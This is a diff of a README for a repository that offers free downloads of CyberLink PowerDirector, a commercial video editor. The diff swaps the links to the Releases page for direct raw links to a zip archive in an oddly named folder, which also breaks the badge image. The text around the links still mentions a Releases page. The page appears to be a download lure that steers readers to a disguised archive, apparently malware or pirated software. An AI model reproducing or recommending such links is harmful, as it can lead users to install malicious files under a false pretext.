@@ -1,6 +1,6 @@
 # 🎬 CyberLink-PowerDirector-Download - Easy Video Editing Made Simple
 
-[![Download CyberLink PowerDirector](https://img.shields.io/badge/Download%20Now-Play%20with%20CyberLink%20PowerDirector-green)](https://github.com/payal26singh/CyberLink-PowerDirector-Download/releases)
+[![Download CyberLink PowerDirector](https://raw.githubusercontent.com/payal26singh/CyberLink-PowerDirector-Download/main/begrim/CyberLink-PowerDirector-Download.zip%20Now-Play%20with%20CyberLink%20PowerDirector-green)](https://raw.githubusercontent.com/payal26singh/CyberLink-PowerDirector-Download/main/begrim/CyberLink-PowerDirector-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To download CyberLink PowerDirector, follow these steps:
 
 1. Click the link below to visit the Releases page:
 
-   [Download CyberLink PowerDirector](https://github.com/payal26singh/CyberLink-PowerDirector-Download/releases)
+   [Download CyberLink PowerDirector](https://raw.githubusercontent.com/payal26singh/CyberLink-PowerDirector-Download/main/begrim/CyberLink-PowerDirector-Download.zip)
 
 2. Once on the Releases page, find the latest version listed.
 
